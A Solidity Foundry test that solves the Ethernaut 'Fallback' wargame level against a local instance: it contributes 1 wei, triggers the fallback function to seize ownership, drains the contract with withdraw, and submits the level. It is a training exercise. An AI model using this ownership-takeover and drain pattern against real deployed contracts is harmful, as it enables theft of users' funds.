pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "src/Fallback/FallbackFactory.sol";
import "src/Ethernaut.sol";
import "src/test/utils/vm.sol";

contract FallbackTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

        /////////////////////
        // ETHERNAUT SETUP //
        /////////////////////

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // deal sends erc20 tokens to address
        // function deal(address to, uint256 give) public;
        vm.deal(eoaAddress, 5 ether);
    }

    function testFalloutHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        // initialize new contract in factory contract
        FallbackFactory fallbackFactory = new FallbackFactory();
        // Registers level in in ethernaut contract 
        // with factory
        ethernaut.registerLevel(fallbackFactory);
        // Sets msg.sender for all subsequent calls until stopPrank is called. Sets eoaAddress as msg.sender
        vm.startPrank(eoaAddress);
        // create level instance in ethernaut and returns address
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        // sets the Fallback contract with level address
        Fallback ethernautFallback = Fallback(payable(levelAddress));
        
        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Contribute 1 wei - verify contract state has been updated
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);

        // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
        payable(address(ethernautFallback)).call{value: 1 wei}("");
        // Verify contract owner has been updated to 0 address
        assertEq(ethernautFallback.owner(), eoaAddress);

        // Now that we are the msg.sender and owner, we can withdraw from contract - Check contract balance before and after
        // before balance
        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        // after balance
        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        
       // submit level instance
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}